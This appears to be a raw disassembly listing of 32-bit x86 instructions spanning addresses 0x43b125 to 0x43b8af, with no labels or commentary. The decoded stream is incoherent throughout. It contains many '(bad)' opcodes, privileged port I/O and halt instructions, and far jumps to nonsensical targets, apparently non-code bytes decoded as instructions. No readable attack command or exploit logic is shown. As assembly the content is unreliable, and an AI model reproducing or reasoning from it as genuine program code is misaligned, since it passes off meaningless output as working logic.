  43b125:	add    DWORD PTR [ebp+0x2],edi
  43b128:	in     eax,dx
  43b129:	mov    BYTE PTR [ebp+0x5],cl
  43b12c:	fwait
  43b12d:	or     dl,bh
  43b12f:	js     0x43b17b
  43b131:	js     0x43b0e5
  43b133:	mov    dh,0xb2
  43b135:	mov    cl,0xa9
  43b137:	ret    0xf4dd
  43b13a:	jle    0x43b10f
  43b13c:	jno    0x43b116
  43b13e:	imul   ebx,DWORD PTR [ebp-0x4c],0x28
  43b142:	icebp  
  43b143:	fmul   DWORD PTR [ebp+0x35b84a3b]
  43b149:	shl    BYTE PTR [esi+0x6a],0xc0
  43b14d:	sub    DWORD PTR [eax+ebp*8+0x2a183e74],edx
  43b154:	mov    eax,ds:0x820ec7
  43b159:	cld    
  43b15a:	sub    eax,0x8ddac569
  43b15f:	lea    esi,[edx+0x457811d8]
  43b165:	(bad)  
  43b166:	in     al,dx
  43b167:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b168:	fwait
  43b169:	mov    ds:0xdb7e5aa,eax
  43b16e:	out    dx,eax
  43b16f:	cmp    al,BYTE PTR [eax]
  43b171:	hlt    
  43b172:	sar    BYTE PTR [ecx+0x4db5bb58],1
  43b178:	mov    cl,0x2f
  43b17a:	pop    ds
  43b17b:	mov    esi,0x8995705a
  43b180:	mov    dh,0x5a
  43b182:	xor    eax,0x6229adda
  43b187:	xchg   ebp,eax
  43b188:	add    DWORD PTR [edx],0xf864e90b
  43b18e:	fsubr  QWORD PTR [eax]
  43b190:	fcom   QWORD PTR [esi]
  43b192:	icebp  
  43b193:	jo     0x43b1f1
  43b195:	mov    ah,0xc1
  43b197:	test   eax,0xe885cadb
  43b19c:	mov    dl,0xd1
  43b19e:	push   esp
  43b19f:	pop    ds
  43b1a0:	repz imul edx,ebp,0xb5176c06
  43b1a7:	in     eax,dx
  43b1a8:	add    dl,ah
  43b1aa:	jl     0x43b160
  43b1ac:	cmp    BYTE PTR [eax-0x1dd714ee],dl
  43b1b2:	push   edx
  43b1b3:	icebp  
  43b1b4:	das    
  43b1b5:	cmc    
  43b1b6:	ins    BYTE PTR es:[edi],dx
  43b1b7:	aad    0xcf
  43b1b9:	fld    QWORD PTR [ebx-0x3b9d49fe]
  43b1bf:	ins    BYTE PTR es:[edi],dx
  43b1c0:	pop    edx
  43b1c1:	mov    ah,0x2c
  43b1c3:	xor    eax,0x711eb505
  43b1c8:	(bad)  
  43b1c9:	lea    ecx,[esi]
  43b1cb:	cwde   
  43b1cc:	outs   dx,BYTE PTR ds:[esi]
  43b1cd:	retf   
  43b1ce:	mov    dl,0xb1
  43b1d0:	adc    bh,BYTE PTR [edi]
  43b1d2:	cs pop edi
  43b1d4:	inc    edx
  43b1d5:	sti    
  43b1d6:	push   esi
  43b1d7:	dec    ebx
  43b1d8:	and    BYTE PTR [edi],dl
  43b1da:	mov    ch,0xa9
  43b1dc:	fwait
  43b1dd:	cmp    dh,dl
  43b1df:	in     al,0x88
  43b1e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b1e2:	or     eax,DWORD PTR [esi+0x21354fca]
  43b1e8:	vpmadcswd ymm6,ymm4,ymm6,YMMWORD PTR [esi+0x72d746ab]
  43b1f2:	push   0x9864da62
  43b1f7:	sub    BYTE PTR [edx+0x125404d],0x83
  43b1fe:	pusha  
  43b1ff:	adc    edx,DWORD PTR ds:0x9c4ed96d
  43b205:	call   0x58b5f79
  43b20a:	ins    BYTE PTR es:[edi],dx
  43b20b:	mov    ebx,0x71c235b5
  43b210:	sub    BYTE PTR [edi+0x689a08ad],cl
  43b216:	in     al,0x36
  43b218:	scas   al,BYTE PTR es:[edi]
  43b219:	cmp    esp,eax
  43b21b:	xchg   BYTE PTR [edx],cl
  43b21d:	mov    dh,0x1b
  43b21f:	iret   
  43b220:	sbb    eax,esp
  43b222:	push   esi
  43b223:	enter  0xc24a,0x6d
  43b227:	mov    DWORD PTR [ebp+0x7ce72201],eax
  43b22d:	jae    0x43b1d6
  43b22f:	popa   
  43b230:	inc    ebp
  43b231:	hlt    
  43b232:	mov    dh,0x6d
  43b234:	ins    BYTE PTR es:[edi],dx
  43b235:	fld    TBYTE PTR [esi+0x74effc14]
  43b23b:	paddusb mm3,QWORD PTR [eax+0x4368efd9]
  43b242:	adc    DWORD PTR [edi-0x22c7192],esi
  43b248:	dec    ebx
  43b249:	stc    
  43b24a:	add    esi,DWORD PTR [ebx+ebp*2+0x3b]
  43b24e:	pop    esi
  43b24f:	jle    0x43b1fd
  43b251:	in     al,dx
  43b252:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b253:	aaa    
  43b254:	bndldx bnd3,[ebx-0x18]
  43b258:	or     BYTE PTR [edx-0x7d],ch
  43b25b:	inc    ecx
  43b25c:	(bad)  
  43b25d:	clc    
  43b25e:	hlt    
  43b25f:	enter  0xc226,0x12
  43b263:	add    eax,0x5e687668
  43b268:	ror    DWORD PTR [ebx-0x1a49ff66],1
  43b26e:	lock sbb eax,0xf2cf654c
  43b274:	dec    edx
  43b275:	or     al,bl
  43b277:	sub    dh,BYTE PTR [ebp+0x487340be]
  43b27d:	or     bl,BYTE PTR [ecx+eax*1]
  43b280:	fwait
  43b281:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b282:	sub    al,0x39
  43b284:	and    dl,bl
  43b286:	lods   eax,DWORD PTR ds:[esi]
  43b287:	ins    DWORD PTR es:[edi],dx
  43b288:	aaa    
  43b289:	arpl   WORD PTR [ebp+0x14],si
  43b28c:	aam    0xe5
  43b28e:	or     BYTE PTR ds:0xa6e9277,bl
  43b294:	jbe    0x43b2ab
  43b296:	pop    ss
  43b297:	mov    ds:0xccccfcee,eax
  43b29c:	(bad)  
  43b29d:	jbe    0x43b2a0
  43b29f:	rol    DWORD PTR [esi],0x21
  43b2a2:	lock lahf 
  43b2a4:	fnstsw WORD PTR [edx+esi*8]
  43b2a7:	adc    esi,DWORD PTR [ebx+eiz*1+0x12e44302]
  43b2ae:	(bad)  
  43b2af:	lea    esp,[esi]
  43b2b1:	sbb    BYTE PTR [ebx-0x46],0xe
  43b2b5:	les    ebp,FWORD PTR [esi+0x72]
  43b2b8:	ret    
  43b2b9:	inc    ebp
  43b2ba:	(bad)  
  43b2bb:	rol    DWORD PTR [ecx],1
  43b2bd:	mov    bh,0x32
  43b2bf:	sub    al,0xe
  43b2c1:	jb     0x43b33e
  43b2c3:	push   edx
  43b2c4:	push   ecx
  43b2c5:	mov    ds:0x2a56db8c,al
  43b2ca:	(bad)  
  43b2cc:	or     edi,DWORD PTR [ebx+0x86b2286]
  43b2d2:	mov    ds:0xbf6e082b,al
  43b2d7:	test   DWORD PTR [edx-0x4ebcd80c],esi
  43b2dd:	inc    esp
  43b2de:	pusha  
  43b2df:	mov    edi,edi
  43b2e1:	icebp  
  43b2e2:	neg    ah
  43b2e4:	cmp    cl,BYTE PTR [edx]
  43b2e6:	push   0xffffffa1
  43b2e8:	inc    edx
  43b2e9:	xchg   ebx,eax
  43b2ea:	add    BYTE PTR ds:0x5b07283,0x1d
  43b2f1:	add    BYTE PTR [edx+0x20031e8b],ch
  43b2f7:	outs   dx,BYTE PTR ds:[esi]
  43b2f8:	pop    ebx
  43b2f9:	push   edi
  43b2fa:	mov    al,0x87
  43b2fc:	sbb    dh,BYTE PTR [esi-0x24411c4a]
  43b302:	push   esp
  43b303:	ror    BYTE PTR [esi],0x12
  43b306:	sub    BYTE PTR [esi],cl
  43b308:	addr16 gs pop es
  43b30b:	xchg   ebp,eax
  43b30c:	sbb    BYTE PTR [edx],0xa
  43b30f:	push   0xffffff83
  43b311:	icebp  
  43b312:	imul   eax,DWORD PTR [esi],0xffffff8a
  43b315:	push   ss
  43b316:	ss data16 das 
  43b319:	sbb    al,0x22
  43b31b:	inc    ecx
  43b31c:	lods   eax,DWORD PTR ds:[esi]
  43b31d:	pop    edx
  43b31e:	fidiv  DWORD PTR [esi+0x1a753201]
  43b324:	imul   ecx,eax,0xd56c345d
  43b32a:	(bad)  
  43b32b:	mov    dh,0x98
  43b32d:	xchg   ebp,eax
  43b32e:	mov    ah,0xe0
  43b330:	xor    eax,0xb66efd4e
  43b335:	xor    eax,0x39cf1153
  43b33a:	xchg   edx,eax
  43b33b:	lock gs cs mov ch,0x22
  43b340:	mov    dh,0xd4
  43b342:	lahf   
  43b343:	pop    ss
  43b344:	xor    ch,BYTE PTR [edi+0x1adb7186]
  43b34a:	mov    ds:0x41667a2,al
  43b34f:	jmp    0xabec7261
  43b354:	fcom   DWORD PTR [esp+esi*1-0x2a]
  43b358:	enter  0x9f3,0xba
  43b35c:	shr    BYTE PTR [esi],1
  43b35e:	mov    ah,0x2f
  43b360:	fs add eax,0x3a3465d2
  43b366:	(bad)  
  43b367:	push   ebx
  43b368:	adc    al,0xbb
  43b36a:	stos   BYTE PTR es:[edi],al
  43b36b:	jecxz  0x43b3a6
  43b36d:	lock outs dx,DWORD PTR ds:[esi]
  43b36f:	fistp  DWORD PTR [edx+0x3eb15ba8]
  43b375:	lods   eax,DWORD PTR ds:[esi]
  43b376:	inc    edx
  43b377:	adc    cl,bh
  43b379:	aam    0xf3
  43b37b:	mov    bl,0xaa
  43b37d:	pop    ebp
  43b37e:	inc    ecx
  43b37f:	je     0x43b3f6
  43b381:	sar    BYTE PTR [edx-0x4b],0x6e
  43b385:	adc    DWORD PTR [eax-0x3dd2df93],esi
  43b38b:	sahf   
  43b38c:	xor    eax,0xa00ba15b
  43b391:	pop    ebp
  43b392:	clc    
  43b393:	lods   al,BYTE PTR ds:[esi]
  43b394:	and    eax,DWORD PTR [edi+0x60]
  43b397:	loop   0x43b3f1
  43b399:	mov    dh,0x85
  43b39b:	bound  ecx,QWORD PTR [ebx+esi*1]
  43b39e:	fwait
  43b39f:	add    ah,BYTE PTR [ecx-0x6546d15b]
  43b3a5:	or     BYTE PTR [edx-0x7be2f1c],ch
  43b3ab:	call   0x8047:0x2a89b405
  43b3b2:	js     0x43b355
  43b3b4:	mov    eax,ds:0xd34d0d88
  43b3b9:	jns    0x43b419
  43b3bb:	jg     0x43b342
  43b3bd:	ins    BYTE PTR es:[edi],dx
  43b3be:	xor    al,0x54
  43b3c0:	jne    0x43b34b
  43b3c2:	sub    eax,0xef09a1ad
  43b3c7:	vsqrtss xmm0,xmm1,DWORD PTR [ecx]
  43b3cb:	mov    eax,0xda3b1115
  43b3d0:	adc    BYTE PTR ds:0xef76330b,dl
  43b3d6:	dec    esi
  43b3d7:	pop    edx
  43b3d8:	fmul   DWORD PTR [eax+0x329b0286]
  43b3de:	mov    al,0x1
  43b3e0:	ror    BYTE PTR [ebp-0x2b067f5a],0xfc
  43b3e7:	hlt    
  43b3e8:	outs   dx,BYTE PTR ds:[esi]
  43b3e9:	mov    ebx,0x6e136280
  43b3ee:	das    
  43b3ef:	or     edi,edx
  43b3f1:	jge    0x43b470
  43b3f3:	cmp    esp,DWORD PTR [eax+0x425043e8]
  43b3f9:	mov    al,0x73
  43b3fb:	sbb    BYTE PTR [edi+0x6b700074],dh
  43b401:	xlat   BYTE PTR ds:[ebx]
  43b402:	cmp    BYTE PTR [edi-0x71],0x17
  43b406:	jg     0x43b40f
  43b408:	add    DWORD PTR [edi-0x4cb87e91],edx
  43b40e:	add    BYTE PTR [ebx+0x59],cl
  43b411:	sti    
  43b412:	push   esp
  43b413:	mov    es,WORD PTR [eax]
  43b415:	mov    dh,0x6d
  43b417:	test   DWORD PTR [ebx],eax
  43b419:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b41a:	outs   dx,DWORD PTR ds:[esi]
  43b41b:	bound  ecx,QWORD PTR [ebx-0x3f]
  43b41e:	jmp    0x9e50:0xe7daa8d6
  43b425:	cmp    ah,BYTE PTR [ecx-0x772bb75c]
  43b42b:	sbb    ah,BYTE PTR [eax]
  43b42d:	stos   DWORD PTR es:[edi],eax
  43b42e:	dec    ecx
  43b42f:	out    0xe8,eax
  43b431:	mov    BYTE PTR [edx-0x45],ah
  43b434:	and    ebp,DWORD PTR [ebp-0x2b]
  43b437:	push   eax
  43b438:	jno    0x43b422
  43b43a:	mov    ebx,0xdd110d6c
  43b43f:	daa    
  43b440:	sbb    eax,0xe0994eac
  43b445:	inc    esp
  43b446:	mov    cl,0x2d
  43b448:	sub    al,0x2c
  43b44a:	call   0xa997bc09
  43b44f:	pop    ebp
  43b450:	cwde   
  43b451:	clc    
  43b452:	pop    ebx
  43b453:	test   BYTE PTR [ecx+0x44cc93ba],ch
  43b459:	mov    cl,0xd0
  43b45b:	test   DWORD PTR [esi+0x3eb5b802],esp
  43b461:	ficomp DWORD PTR [ecx+0x1e]
  43b464:	(bad)  
  43b466:	scas   al,BYTE PTR es:[edi]
  43b467:	mov    eax,0xd56a8835
  43b46c:	out    dx,eax
  43b46d:	add    edi,DWORD PTR [edx-0x5e]
  43b470:	mov    bh,dl
  43b472:	shr    DWORD PTR [ebp-0x590d14e7],1
  43b478:	cmp    ah,BYTE PTR [ecx]
  43b47a:	mov    esp,0x86b76da8
  43b47f:	and    DWORD PTR [esi],eax
  43b481:	add    eax,0x3cce8bfd
  43b486:	outs   dx,BYTE PTR ds:[esi]
  43b487:	scas   al,BYTE PTR es:[edi]
  43b488:	pusha  
  43b489:	pop    ebx
  43b48a:	test   al,0x40
  43b48c:	sub    DWORD PTR [ebp-0x5a698874],0x16a88585
  43b496:	stos   BYTE PTR es:[edi],al
  43b497:	mov    ch,0x94
  43b499:	out    0xad,al
  43b49b:	imul   esp,ecx,0x6b00da82
  43b4a1:	nop
  43b4a2:	test   eax,0x4ba89b13
  43b4a7:	std    
  43b4a8:	jge    0x43b43f
  43b4aa:	dec    ecx
  43b4ab:	push   ss
  43b4ac:	mov    ebp,0x206ad8e8
  43b4b1:	loopne 0x43b4e3
  43b4b3:	js     0x43b4bc
  43b4b5:	push   edx
  43b4b6:	push   edx
  43b4b7:	sub    BYTE PTR [eax+0x12dd114d],cl
  43b4bd:	cmp    bh,BYTE PTR [ebx-0x294cc1a2]
  43b4c3:	lea    ebp,[ebp+0x283244ae]
  43b4c9:	int    0xcc
  43b4cb:	rol    DWORD PTR [edx+eiz*1],0x6a
  43b4cf:	push   ebx
  43b4d0:	add    bl,cl
  43b4d2:	sub    BYTE PTR [edi-0x3a],cl
  43b4d5:	pop    ebp
  43b4d6:	adc    al,0xa3
  43b4d8:	jno    0x43b47b
  43b4da:	or     DWORD PTR [eax],ecx
  43b4dc:	jae    0x43b4bd
  43b4de:	aaa    
  43b4df:	pop    esp
  43b4e0:	inc    edx
  43b4e1:	test   BYTE PTR [eax+0x16],bl
  43b4e4:	push   ss
  43b4e5:	push   0xe55ee92c
  43b4ea:	sub    BYTE PTR [edi],cl
  43b4ec:	sbb    eax,0xd9a9b415
  43b4f1:	retf   
  43b4f2:	fidiv  DWORD PTR [edi-0x93aef42]
  43b4f8:	mov    esp,edi
  43b4fa:	repz push ss
  43b4fc:	sub    al,0x8
  43b4fe:	dec    ecx
  43b4ff:	push   0xd4d5b51b
  43b504:	mov    eax,0x86eaa504
  43b509:	ja     0x43b4e6
  43b50b:	push   ss
  43b50c:	pop    eax
  43b50d:	push   ss
  43b50e:	ror    ah,cl
  43b510:	pop    esp
  43b511:	leave  
  43b512:	(bad)  
  43b513:	fisttp QWORD PTR [eax+0x144d8035]
  43b519:	jno    0x43b4d7
  43b51b:	dec    esp
  43b51c:	mov    al,ds:0x36de6c4
  43b521:	inc    ebp
  43b522:	cmp    ebx,DWORD PTR [eax+0x247482fd]
  43b528:	sbb    al,0x2c
  43b52a:	test   DWORD PTR [ebp-0x22a949d5],ebp
  43b530:	test   al,0xb7
  43b532:	pop    ebx
  43b533:	jp     0x43b5a5
  43b535:	jbe    0x43b565
  43b537:	xor    al,0x15
  43b539:	aam    0x6e
  43b53b:	ss loopne 0x43b55d
  43b53e:	test   eax,0xa9b64a98
  43b543:	jmp    0x4811:0x34b0bc56
  43b54a:	cmp    eax,0x5adf2a44
  43b54f:	stos   BYTE PTR es:[edi],al
  43b550:	cmc    
  43b551:	not    BYTE PTR [edi+0x1be6007a]
  43b557:	popa   
  43b558:	inc    ebx
  43b559:	push   ebp
  43b55a:	pop    ebp
  43b55b:	aam    0xc0
  43b55d:	dec    edi
  43b55e:	mov    BYTE PTR [ecx+0x6e20738e],al
  43b564:	fild   DWORD PTR [edx+0x40]
  43b567:	test   eax,0xda9edc50
  43b56c:	fisubr DWORD PTR [ebp+0x17]
  43b56f:	push   ebp
  43b570:	fsub   QWORD PTR [esi+edx*1+0x33]
  43b575:	test   al,0x7b
  43b577:	push   eax
  43b578:	fild   DWORD PTR [ebx+0x51]
  43b57b:	mov    ah,0x71
  43b57d:	and    esi,DWORD PTR [edx-0x446ac159]
  43b583:	or     BYTE PTR [eax+0x7d60fb6d],bh
  43b589:	push   esp
  43b58a:	mov    BYTE PTR [ecx-0x7fdc5dd4],ch
  43b590:	ss add al,0x7a
  43b593:	add    al,0x23
  43b595:	pushf  
  43b596:	mov    ds:0x20a2a16a,al
  43b59b:	fiadd  WORD PTR [edi+0x50]
  43b59e:	pop    esp
  43b59f:	fcomp  DWORD PTR [edx]
  43b5a1:	push   ds
  43b5a2:	xchg   esp,eax
  43b5a3:	retf   
  43b5a4:	sbb    DWORD PTR [eax+0x60012fb],edi
  43b5aa:	mov    cl,BYTE PTR [ebp-0x57]
  43b5ad:	xor    eax,0x82ec0180
  43b5b2:	mov    bl,BYTE PTR [ebx]
  43b5b4:	in     eax,dx
  43b5b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b5b6:	mov    WORD PTR [eax],?
  43b5b8:	in     al,0xc9
  43b5ba:	mov    al,ds:0x12a1ada
  43b5bf:	loopne 0x43b552
  43b5c1:	mov    al,0x24
  43b5c3:	jbe    0x43b616
  43b5c5:	jne    0x43b5b2
  43b5c7:	add    DWORD PTR [edi-0x1a],esp
  43b5ca:	iret   
  43b5cb:	jns    0x43b5f7
  43b5cd:	lea    esp,[eax-0x57]
  43b5d0:	mov    ah,0x2b
  43b5d2:	test   al,0xa3
  43b5d4:	xor    al,bl
  43b5d6:	mov    eax,ds:0x71540d0e
  43b5db:	arpl   WORD PTR [edx+0x12],bx
  43b5de:	pop    edi
  43b5df:	cdq    
  43b5e0:	or     dh,BYTE PTR [esi-0x4a]
  43b5e3:	mov    dh,0x2b
  43b5e5:	mov    al,ds:0x9784552e
  43b5ea:	aam    0x65
  43b5ec:	inc    ebx
  43b5ed:	sub    eax,0x29d8d8dc
  43b5f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b5f3:	fiadd  WORD PTR [eax+0x52518e1b]
  43b5f9:	and    BYTE PTR [esi-0x7792bf8b],dh
  43b5ff:	jo     0x43b66a
  43b601:	sub    eax,0x7483cd0e
  43b606:	push   ebp
  43b607:	mov    ebx,0xb0a765e8
  43b60c:	test   dl,0x2c
  43b60f:	or     DWORD PTR [ebx+0x192c2e20],ecx
  43b615:	sbb    esp,DWORD PTR [edx]
  43b617:	adc    DWORD PTR [esi+0x6a],esi
  43b61a:	mov    ebx,0x26a1617c
  43b61f:	mov    eax,0xaab397f8
  43b624:	add    BYTE PTR [eax+0x7b],al
  43b627:	mov    eax,0xaba174c8
  43b62c:	push   0x1c1c32a1
  43b631:	sahf   
  43b632:	(bad)  
  43b633:	mov    DWORD PTR [eax],ebp
  43b635:	jbe    0x43b688
  43b637:	mov    al,0xab
  43b639:	mov    ch,0x3c
  43b63b:	pop    ebx
  43b63c:	sub    esi,DWORD PTR [esi-0x25a0ef53]
  43b642:	aam    0xa2
  43b644:	dec    esi
  43b645:	xchg   edx,eax
  43b646:	mov    al,0x50
  43b648:	add    eax,0x78026c6d
  43b64d:	arpl   bp,bx
  43b64f:	fcmovnbe st,st(6)
  43b651:	mov    edx,0x2a4fe3f1
  43b656:	in     eax,dx
  43b657:	pop    ds
  43b658:	cmp    BYTE PTR [ebx],0x6f
  43b65b:	add    bl,BYTE PTR [eax+0x51]
  43b65e:	ins    BYTE PTR es:[edi],dx
  43b65f:	inc    esp
  43b660:	ins    DWORD PTR es:[edi],dx
  43b661:	adc    al,0xb8
  43b663:	mov    edi,0x222ed010
  43b668:	fsub   st,st(3)
  43b66a:	not    bl
  43b66c:	or     al,0xa1
  43b66e:	daa    
  43b66f:	or     eax,DWORD PTR [ebp-0x25]
  43b672:	adc    DWORD PTR [ecx+ecx*1-0x1fed198c],ebx
  43b679:	mov    ah,0x6d
  43b67b:	add    edx,DWORD PTR [eax-0x55]
  43b67e:	idiv   BYTE PTR [eax]
  43b680:	add    bl,BYTE PTR [eax-0x7249220e]
  43b686:	push   ss
  43b687:	mov    esi,0xca98ec3f
  43b68c:	inc    esp
  43b68d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b68e:	xchg   ebp,eax
  43b68f:	dec    ebx
  43b690:	add    eax,0xc4151034
  43b695:	mov    BYTE PTR [esp+edx*8+0x52],bl
  43b699:	adc    eax,DWORD PTR [eax]
  43b69b:	cmp    ch,BYTE PTR [ebp+0x5346310b]
  43b6a1:	add    BYTE PTR [ebx+0x3f],bl
  43b6a4:	out    dx,al
  43b6a5:	nop
  43b6a6:	test   eax,0x6d6d000f
  43b6ab:	loope  0x43b726
  43b6ad:	xor    dl,BYTE PTR [eax]
  43b6af:	fistp  WORD PTR [esi-0x692d15c]
  43b6b5:	ins    DWORD PTR es:[edi],dx
  43b6b6:	mov    eax,ds:0x955dee65
  43b6bb:	jo     0x43b68d
  43b6bd:	add    BYTE PTR [edi-0x29ac2865],bh
  43b6c3:	lods   eax,DWORD PTR ds:[esi]
  43b6c4:	stos   DWORD PTR es:[edi],eax
  43b6c5:	stos   BYTE PTR es:[edi],al
  43b6c6:	mov    edx,0x75da5b29
  43b6cb:	jg     0x43b6a3
  43b6cd:	mov    ds:0xac45436,eax
  43b6d2:	jno    0x43b737
  43b6d4:	test   ch,dl
  43b6d6:	stos   BYTE PTR es:[edi],al
  43b6d7:	jbe    0x43b719
  43b6d9:	mov    ah,0x2c
  43b6db:	mov    bh,BYTE PTR ss:[eax+0x7a]
  43b6df:	jbe    0x43b6e5
  43b6e1:	mov    ch,0x83
  43b6e3:	sub    edx,DWORD PTR [ebx-0x2b95d79b]
  43b6e9:	fimul  DWORD PTR [esi]
  43b6eb:	mov    dl,bl
  43b6ed:	mov    edi,0x6701aaef
  43b6f2:	push   esi
  43b6f3:	fidiv  DWORD PTR [esi]
  43b6f5:	xchg   esi,eax
  43b6f6:	push   ss
  43b6f7:	xchg   ecx,eax
  43b6f8:	enterw 0x7828,0x52
  43b6fd:	jno    0x43b6c9
  43b6ff:	push   0x28
  43b701:	add    BYTE PTR ds:0xe622f792,0x85
  43b708:	or     eax,0x62565c40
  43b70d:	fidiv  WORD PTR [edi]
  43b70f:	inc    esi
  43b710:	jmp    0x8ae76b4c
  43b715:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b716:	xchg   ebx,eax
  43b717:	cwde   
  43b718:	(bad)  
  43b719:	fcmovb st,st(0)
  43b71b:	nop
  43b71c:	mov    BYTE PTR [eax-0xef7aa2c],bh
  43b722:	adc    BYTE PTR [esp+edx*2+0x26d510d8],0xe4
  43b72a:	lea    esi,[eax+0x55]
  43b72d:	stos   DWORD PTR es:[edi],eax
  43b72e:	push   0x4d
  43b730:	inc    ecx
  43b731:	ins    BYTE PTR es:[edi],dx
  43b732:	and    al,bl
  43b734:	xchg   edi,eax
  43b735:	mov    edi,esi
  43b737:	mov    cl,0xd8
  43b739:	sbb    ch,BYTE PTR [eax]
  43b73b:	mov    dh,0xe8
  43b73d:	fwait
  43b73e:	cmp    al,0x85
  43b740:	pusha  
  43b741:	adc    al,0xfc
  43b743:	push   0x1c5c1113
  43b748:	dec    edi
  43b749:	xchg   esp,eax
  43b74a:	std    
  43b74b:	in     eax,0xc2
  43b74d:	loop   0x43b7b5
  43b74f:	test   al,0x23
  43b751:	or     al,0x90
  43b753:	jp     0x43b76c
  43b755:	(bad)  
  43b756:	aas    
  43b757:	add    eax,0xc0baddb
  43b75c:	sbb    eax,0xd480418c
  43b761:	mov    BYTE PTR [ecx],dl
  43b763:	sub    al,0x6d
  43b765:	dec    ebp
  43b766:	push   esi
  43b767:	mov    ah,0x41
  43b769:	dec    edi
  43b76a:	xlat   BYTE PTR ds:[ebx]
  43b76b:	adc    dl,al
  43b76d:	push   edx
  43b76e:	in     eax,dx
  43b76f:	inc    edi
  43b770:	call   0xb76403f7
  43b775:	xchg   esi,eax
  43b776:	or     BYTE PTR [eax+0x2b],ah
  43b779:	enter  0xaf38,0xaa
  43b77d:	add    al,0x5d
  43b77f:	push   0xf4ab026d
  43b784:	or     bh,BYTE PTR ds:0x6db4ac35
  43b78a:	mov    ch,0x4d
  43b78c:	cmp    eax,0xafd7a757
  43b791:	mov    ebx,0x70ad81f2
  43b796:	aad    0x12
  43b798:	int3   
  43b799:	inc    esi
  43b79a:	adc    eax,ebx
  43b79c:	inc    edx
  43b79d:	lods   eax,DWORD PTR ds:[esi]
  43b79e:	xor    eax,0x5612381a
  43b7a3:	in     eax,0x6e
  43b7a5:	sbb    ebx,DWORD PTR ds:0x2c41b750
  43b7ab:	lock pmaxsw mm1,mm7
  43b7af:	call   esp
  43b7b1:	lea    ebp,[esi]
  43b7b3:	stos   BYTE PTR es:[edi],al
  43b7b4:	ja     0x43b7ca
  43b7b6:	adc    BYTE PTR ds:0xf441ab40,0x61
  43b7bd:	inc    ebx
  43b7be:	mov    bh,0xef
  43b7c0:	xchg   esi,eax
  43b7c1:	(bad)  
  43b7c2:	xchg   esp,eax
  43b7c3:	push   esi
  43b7c4:	lods   eax,DWORD PTR ds:[esi]
  43b7c5:	mov    DWORD PTR [eax-0x22d9028b],edi
  43b7cb:	sub    al,0xb4
  43b7cd:	inc    ecx
  43b7ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b7cf:	sahf   
  43b7d0:	ins    DWORD PTR es:[edi],dx
  43b7d1:	pop    es
  43b7d2:	ror    DWORD PTR [ebp-0x2da3ba52],1
  43b7d8:	cwde   
  43b7d9:	stos   DWORD PTR es:[edi],eax
  43b7da:	call   0x4085:0xaa86b7f8
  43b7e1:	retf   0x61bd
  43b7e4:	xchg   BYTE PTR [eax-0x7df7b322],al
  43b7ea:	or     eax,0x9c66fc51
  43b7ef:	fcmovnu st,st(2)
  43b7f1:	pop    eax
  43b7f2:	push   0x68499837
  43b7f7:	jne    0x43b870
  43b7f9:	std    
  43b7fa:	stos   BYTE PTR es:[edi],al
  43b7fb:	xchg   ebp,eax
  43b7fc:	lods   eax,DWORD PTR ds:[esi]
  43b7fd:	inc    ecx
  43b7fe:	or     eax,0x535f2d74
  43b803:	not    BYTE PTR [eax]
  43b805:	and    esp,DWORD PTR [edx-0x25]
  43b808:	inc    eax
  43b809:	sar    DWORD PTR [esi],0x5f
  43b80c:	aas    
  43b80d:	mov    eax,ds:0x142b097
  43b812:	sub    al,0xb7
  43b814:	scas   al,BYTE PTR es:[edi]
  43b815:	pushf  
  43b816:	(bad)  
  43b817:	pop    esp
  43b818:	jmp    0x5740:0x4ab74dd8
  43b81f:	rol    edi,cl
  43b821:	aaa    
  43b822:	ins    DWORD PTR es:[edi],dx
  43b823:	mov    edx,ebx
  43b825:	aam    0x42
  43b827:	inc    ebx
  43b828:	add    eax,0xd5555259
  43b82d:	mov    ah,BYTE PTR [edx+0x17]
  43b830:	sub    al,0x8e
  43b832:	out    0x4f,eax
  43b834:	inc    ebx
  43b835:	lods   al,BYTE PTR ds:[esi]
  43b836:	stos   BYTE PTR es:[edi],al
  43b837:	pop    ebp
  43b838:	inc    ebp
  43b839:	ins    DWORD PTR es:[edi],dx
  43b83a:	mov    ah,BYTE PTR [eax]
  43b83c:	push   cs
  43b83d:	add    ebp,DWORD PTR [edx-0x27a724df]
  43b843:	push   0x71
  43b845:	arpl   WORD PTR [esi-0x6b],ax
  43b848:	test   DWORD PTR ds:0x68802eb4,edx
  43b84e:	mov    bh,0x6d
  43b850:	popa   
  43b851:	sub    bh,ch
  43b853:	or     al,0xd7
  43b855:	dec    eax
  43b856:	mov    esp,0x226f54d
  43b85b:	loopne 0x43b833
  43b85d:	cmp    bl,dl
  43b85f:	mov    dh,0xe9
  43b861:	sub    ecx,edi
  43b863:	imul   edx,DWORD PTR [ecx+0x6c],0xc25daedb
  43b86a:	jne    0x43b892
  43b86c:	pop    ebp
  43b86d:	ds inc esp
  43b86f:	mov    dh,0x8e
  43b871:	xor    BYTE PTR [esi],0xec
  43b874:	sahf   
  43b875:	loope  0x43b874
  43b877:	add    eax,0x511d8c05
  43b87c:	ins    BYTE PTR es:[edi],dx
  43b87d:	aaa    
  43b87e:	add    BYTE PTR [ebx-0x355eebd0],al
  43b884:	jne    0x43b88a
  43b886:	ins    DWORD PTR es:[edi],dx
  43b887:	pop    ebx
  43b888:	add    al,0x6e
  43b88a:	outs   dx,BYTE PTR ds:[esi]
  43b88b:	es gs inc esp
  43b88e:	push   ebp
  43b88f:	push   ebx
  43b890:	push   ebx
  43b891:	jo     0x43b888
  43b893:	cmp    dl,dh
  43b895:	pop    esp
  43b896:	mov    esi,0x7867d851
  43b89b:	les    eax,FWORD PTR [edi+edi*1]
  43b89e:	test   BYTE PTR [eax],dh
  43b8a0:	add    BYTE PTR [eax+0x5b712c88],bh
  43b8a6:	mov    dh,0xad
  43b8a8:	mov    bl,0x85
  43b8aa:	jno    0x43b84b
  43b8ac:	scas   eax,DWORD PTR es:[edi]
  43b8ad:	push   cs
  43b8ae:	scas   eax,DWORD PTR es:[edi]
  43b8af:	add    eax,0xa1768170
